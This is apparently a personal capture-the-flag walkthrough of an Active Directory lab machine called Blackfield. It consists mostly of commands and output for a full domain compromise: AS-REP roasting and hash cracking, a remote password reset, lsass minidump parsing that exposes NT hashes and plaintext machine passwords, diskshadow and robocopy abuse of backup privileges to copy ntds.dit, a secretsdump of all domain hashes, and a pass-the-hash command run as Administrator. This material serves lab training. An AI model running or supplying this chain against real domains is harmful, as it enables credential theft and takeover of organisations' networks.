

nmap

```
kali@kali ~> nmap -sC -sV blackfield.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-13 07:03 EST
Nmap scan report for blackfield.local (10.10.10.192)
Host is up (0.073s latency).
rDNS record for 10.10.10.192: DC01
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-13 19:03:23Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name) ????
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-02-13T19:03:32
|_  start_date: N/A
|_clock-skew: 7h00m00s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.40 seconds

```



did an asrep with RID-BRUTE learnt this from my experience ina  shit box called rebound 


```

$krb5asrep$23$support@BLACKFIELD.LOCAL:b3b71140d127a0c505a809bd862fc2d9$ca90ba4ad57eda8c00a24c3276007cce22215ad7a9c08f3c3108ac1a73a825a9aadb620bd1d19e1c5edd5d21fe2640c0e2bd3b7240eabab8686b3822ff115e21920a4dc1d105f87d742a24aaf08ab55c4a8465a0a8b013fe7d8b677176bcff360d71442c4a59215fc03a4773fe05578383a1680856e8c3d992a237baea84807777cb80beb4cfd833505ad4e3b71eb496356139ead1abf13b10d6dbf00f9629b2b2bf591492da5ff7d7923ef89d04ba887dab0bef172a61551f6e3cc8e6e85b130da3aa3c1cffadaad8b5110fa366c2ee8101081e82e410874a2bc285c3f8e42533f39b41df564815e1da9dac984d78f01f1b8dd7:#00^BlackKnight
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$support@BLACKFIELD.LOCAL:b3b71140d127...1b8dd7

```


```
kali@kali ~> nxc smb blackfield.local -u 'support' -p '#00^BlackKnight'
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)                                                                          
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight                                                                                                                                             
```



```
kali@kali ~> pth-net rpc Password 'audit2020' 'Password123!' -U 'blackfield.local'/'support'%'#00^BlackKnight' -S '10.10.10.192'
E_md4hash wrapper called.
kali@kali ~> nxc smb blackfield.local -u audit2020 -p 'Password123!'
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:Password123! 
```



after that we find out that we have sebackup privilege so we robocopy that bitch



```python
kali@kali ~/H/b/memory_analysis> pypykatz lsa minidump lsass.DMP 
INFO:pypykatz:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: svc_backup
                Domain: BLACKFIELD.LOCAL
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)

== LogonSession ==
authentication_id 365835 (5950b)
session_id 2
username UMFD-2
domainname Font Driver Host
logon_server 
logon_time 2020-02-23T17:59:38.218491+00:00
sid S-1-5-96-0-2
luid 365835
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
                DPAPI: 0000000000000000000000000000000000000000
        == WDIGEST [5950b]==
                username DC01$
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
                password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
        == WDIGEST [5950b]==
                username DC01$
                domainname BLACKFIELD
                password None
                password (hex)

== LogonSession ==
authentication_id 365493 (593b5)
session_id 2
username UMFD-2
domainname Font Driver Host
logon_server 
logon_time 2020-02-23T17:59:38.200147+00:00
sid S-1-5-96-0-2
luid 365493
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
                DPAPI: 0000000000000000000000000000000000000000
        == WDIGEST [593b5]==
                username DC01$
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
                password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
        == WDIGEST [593b5]==
                username DC01$
                domainname BLACKFIELD
                password None
                password (hex)

== LogonSession ==
authentication_id 257142 (3ec76)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server 
logon_time 2020-02-23T17:59:13.318909+00:00
sid S-1-5-18
luid 257142
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.LOCAL

== LogonSession ==
authentication_id 153705 (25869)
session_id 1
username Administrator
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T17:59:04.506080+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-500
luid 153705
        == MSV ==
                Username: Administrator
                Domain: BLACKFIELD
                LM: NA
                NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
                SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368
                DPAPI: 240339f898b6ac4ce3f34702e4a8955000000000
        == WDIGEST [25869]==
                username Administrator
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: Administrator
                Domain: BLACKFIELD.LOCAL
        == WDIGEST [25869]==
                username Administrator
                domainname BLACKFIELD
                password None
                password (hex)
        == DPAPI [25869]==
                luid 153705
                key_guid d1f69692-cfdc-4a80-959e-bab79c9c327e
                masterkey 769c45bf7ceb3c0e28fb78f2e355f7072873930b3c1d3aef0e04ecbb3eaf16aa946e553007259bf307eb740f222decadd996ed660ffe648b0440d84cd97bf5a5
                sha1_masterkey d04452f8459a46460939ced67b971bcf27cb2fb9

== LogonSession ==
authentication_id 137110 (21796)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server 
logon_time 2020-02-23T17:58:27.068590+00:00
sid S-1-5-18
luid 137110
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.LOCAL

== LogonSession ==
authentication_id 134695 (20e27)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server 
logon_time 2020-02-23T17:58:26.678019+00:00
sid S-1-5-18
luid 134695
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.LOCAL

== LogonSession ==
authentication_id 40310 (9d76)
session_id 1
username DWM-1
domainname Window Manager
logon_server 
logon_time 2020-02-23T17:57:46.897202+00:00
sid S-1-5-90-0-1
luid 40310
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
                DPAPI: 0000000000000000000000000000000000000000
        == WDIGEST [9d76]==
                username DC01$
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
                password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
        == WDIGEST [9d76]==
                username DC01$
                domainname BLACKFIELD
                password None
                password (hex)

== LogonSession ==
authentication_id 40232 (9d28)
session_id 1
username DWM-1
domainname Window Manager
logon_server 
logon_time 2020-02-23T17:57:46.897202+00:00
sid S-1-5-90-0-1
luid 40232
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
                DPAPI: 0000000000000000000000000000000000000000
        == WDIGEST [9d28]==
                username DC01$
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
                password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
        == WDIGEST [9d28]==
                username DC01$
                domainname BLACKFIELD
                password None
                password (hex)

== LogonSession ==
authentication_id 996 (3e4)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server 
logon_time 2020-02-23T17:57:46.725846+00:00
sid S-1-5-20
luid 996
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
                DPAPI: 0000000000000000000000000000000000000000
        == WDIGEST [3e4]==
                username DC01$
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: dc01$
                Domain: BLACKFIELD.local
                Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
                password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
        == WDIGEST [3e4]==
                username DC01$
                domainname BLACKFIELD
                password None
                password (hex)

== LogonSession ==
authentication_id 24410 (5f5a)
session_id 1
username UMFD-1
domainname Font Driver Host
logon_server 
logon_time 2020-02-23T17:57:46.569111+00:00
sid S-1-5-96-0-1
luid 24410
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
                DPAPI: 0000000000000000000000000000000000000000
        == WDIGEST [5f5a]==
                username DC01$
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
                password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
        == WDIGEST [5f5a]==
                username DC01$
                domainname BLACKFIELD
                password None
                password (hex)

== LogonSession ==
authentication_id 406499 (633e3)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406499
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
        == WDIGEST [633e3]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: svc_backup
                Domain: BLACKFIELD.LOCAL
        == WDIGEST [633e3]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)
        == DPAPI [633e3]==
                luid 406499
                key_guid 836e8326-d136-4b9f-94c7-3353c4e45770
                masterkey 0ab34d5f8cb6ae5ec44a4cb49ff60c8afdf0b465deb9436eebc2fcb1999d5841496c3ffe892b0a6fed6742b1e13a5aab322b6ea50effab71514f3dbeac025bdf
                sha1_masterkey 6efc8aa0abb1f2c19e101fbd9bebfb0979c4a991

== LogonSession ==
authentication_id 366665 (59849)
session_id 2
username DWM-2
domainname Window Manager
logon_server 
logon_time 2020-02-23T17:59:38.293877+00:00
sid S-1-5-90-0-2
luid 366665
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
                DPAPI: 0000000000000000000000000000000000000000
        == WDIGEST [59849]==
                username DC01$
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
                password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
        == WDIGEST [59849]==
                username DC01$
                domainname BLACKFIELD
                password None
                password (hex)

== LogonSession ==
authentication_id 366649 (59839)
session_id 2
username DWM-2
domainname Window Manager
logon_server 
logon_time 2020-02-23T17:59:38.293877+00:00
sid S-1-5-90-0-2
luid 366649
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
                DPAPI: 0000000000000000000000000000000000000000
        == WDIGEST [59839]==
                username DC01$
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
                password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
        == WDIGEST [59839]==
                username DC01$
                domainname BLACKFIELD
                password None
                password (hex)

== LogonSession ==
authentication_id 256940 (3ebac)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server 
logon_time 2020-02-23T17:59:13.068835+00:00
sid S-1-5-18
luid 256940
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.LOCAL

== LogonSession ==
authentication_id 136764 (2163c)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server 
logon_time 2020-02-23T17:58:27.052945+00:00
sid S-1-5-18
luid 136764
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.LOCAL

== LogonSession ==
authentication_id 134935 (20f17)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server 
logon_time 2020-02-23T17:58:26.834285+00:00
sid S-1-5-18
luid 134935
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.LOCAL

== LogonSession ==
authentication_id 997 (3e5)
session_id 0
username LOCAL SERVICE
domainname NT AUTHORITY
logon_server 
logon_time 2020-02-23T17:57:47.162285+00:00
sid S-1-5-19
luid 997
        == Kerberos ==
                Username: 
                Domain: 

== LogonSession ==
authentication_id 24405 (5f55)
session_id 0
username UMFD-0
domainname Font Driver Host
logon_server 
logon_time 2020-02-23T17:57:46.569111+00:00
sid S-1-5-96-0-0
luid 24405
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
                DPAPI: 0000000000000000000000000000000000000000
        == WDIGEST [5f55]==
                username DC01$
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
                password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
        == WDIGEST [5f55]==
                username DC01$
                domainname BLACKFIELD
                password None
                password (hex)

== LogonSession ==
authentication_id 24294 (5ee6)
session_id 0
username UMFD-0
domainname Font Driver Host
logon_server 
logon_time 2020-02-23T17:57:46.554117+00:00
sid S-1-5-96-0-0
luid 24294
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
                DPAPI: 0000000000000000000000000000000000000000
        == WDIGEST [5ee6]==
                username DC01$
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
                password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
        == WDIGEST [5ee6]==
                username DC01$
                domainname BLACKFIELD
                password None
                password (hex)

== LogonSession ==
authentication_id 24282 (5eda)
session_id 1
username UMFD-1
domainname Font Driver Host
logon_server 
logon_time 2020-02-23T17:57:46.554117+00:00
sid S-1-5-96-0-1
luid 24282
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
                DPAPI: 0000000000000000000000000000000000000000
        == WDIGEST [5eda]==
                username DC01$
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
                password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
        == WDIGEST [5eda]==
                username DC01$
                domainname BLACKFIELD
                password None
                password (hex)

== LogonSession ==
authentication_id 22028 (560c)
session_id 0
username 
domainname 
logon_server 
logon_time 2020-02-23T17:57:44.959593+00:00
sid None
luid 22028
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
                DPAPI: 0000000000000000000000000000000000000000

== LogonSession ==
authentication_id 999 (3e7)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server 
logon_time 2020-02-23T17:57:44.913221+00:00
sid S-1-5-18
luid 999
        == WDIGEST [3e7]==
                username DC01$
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: dc01$
                Domain: BLACKFIELD.LOCAL
        == WDIGEST [3e7]==
                username DC01$
                domainname BLACKFIELD
                password None
                password (hex)
        == DPAPI [3e7]==
                luid 999
                key_guid 0f7e926c-c502-4cad-90fa-32b78425b5a9
                masterkey ebbb538876be341ae33e88640e4e1d16c16ad5363c15b0709d3a97e34980ad5085436181f66fa3a0ec122d461676475b24be001736f920cd21637fee13dfc616
                sha1_masterkey ed834662c755c50ef7285d88a4015f9c5d6499cd
        == DPAPI [3e7]==
                luid 999
                key_guid f611f8d0-9510-4a8a-94d7-5054cc85a654
                masterkey 7c874d2a50ea2c4024bd5b24eef4515088cf3fe21f3b9cafd3c81af02fd5ca742015117e7f2675e781ce7775fcde2740ae7207526ce493bdc89d2ae3eb0e02e9
                sha1_masterkey cf1c0b79da85f6c84b96fd7a0a5d7a5265594477
        == DPAPI [3e7]==
                luid 999
                key_guid 31632c55-7a7c-4c51-9065-65469950e94e
                masterkey 825063c43b0ea082e2d3ddf6006a8dcced269f2d34fe4367259a0907d29139b58822349e687c7ea0258633e5b109678e8e2337d76d4e38e390d8b980fb737edb
                sha1_masterkey 6f3e0e7bf68f9a7df07549903888ea87f015bb01
        == DPAPI [3e7]==
                luid 999
                key_guid 7e0da320-072c-4b4a-969f-62087d9f9870
                masterkey 1fe8f550be4948f213e0591eef9d876364246ea108da6dd2af73ff455485a56101067fbc669e99ad9e858f75ae9bd7e8a6b2096407c4541e2b44e67e4e21d8f5
                sha1_masterkey f50955e8b8a7c921fdf9bac7b9a2483a9ac3ceed

```




after that mini dump using pypykatz we also have this 


```python
kali@kali ~> nxc smb blackfield.local -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d
```


so ik we have winrm privileges because we have remote users group, moving on from this but before that ik we also have BackupOperators so let me prepare the script to do a robocopy attack

```python
kali@kali ~> cat script.dsh
set context persistent nowriters
add volume c: alias sawyer
create
expose %sawyer% z:
kali@kali ~> unix2dos script.dsh
unix2dos: converting file script.dsh to DOS format                                        
```


```python
*Evil-WinRM* PS C:\temp> upload script.dsh

Info: Uploading /home/kali/script.dsh to C:\temp\script.dsh

Data: 120 bytes of 120 bytes copied

Info: Upload successful!


```


```python
*Evil-WinRM* PS C:\temp> diskshadow /s script.dsh
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  2/13/2025 12:59:19 PM

-> set context persistent nowriters
-> add volume c: alias sawyer
-> create
Alias sawyer for shadow ID {987a36f8-eafd-4cf9-95a0-3d595bb18e1a} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {ca3e88eb-08e8-4787-af2b-7718c2dc1faf} set as environment variable.

Querying all shadow copies with the shadow copy set ID {ca3e88eb-08e8-4787-af2b-7718c2dc1faf}

        * Shadow copy ID = {987a36f8-eafd-4cf9-95a0-3d595bb18e1a}               %sawyer%
                - Shadow copy set: {ca3e88eb-08e8-4787-af2b-7718c2dc1faf}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 2/13/2025 12:59:20 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %sawyer% z:
-> %sawyer% = {987a36f8-eafd-4cf9-95a0-3d595bb18e1a}
The shadow copy was successfully exposed as z:\.
->
*Evil-WinRM* PS C:\temp> robocopy /b z:\windows\ntds . ntds.dit
```


```python
*Evil-WinRM* PS C:\temp> dir


    Directory: C:\temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/13/2025  12:59 PM            609 2025-02-13_24-59-20_DC01.cab
-a----        2/13/2025  11:19 AM       18874368 ntds.dit
-a----        2/13/2025  12:59 PM             90 script.dsh


*Evil-WinRM* PS C:\temp> download ntds.dit
```


i also did save the system.save file but I didnt note it here so becareful

```python
kali@kali ~> impacket-secretsdump -ntds ntds.dit -system system.save local
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:855e20018bdcdf8eac51ee6834078cf7:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::

```


now to collect the flags

```python
kali@kali ~> nxc smb blackfield.local -u administrator -H 184fb5e5178480be64824d4cd53b99ee -X 'cat c:\users\administrator\desktop\root.txt'
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)                                                                          
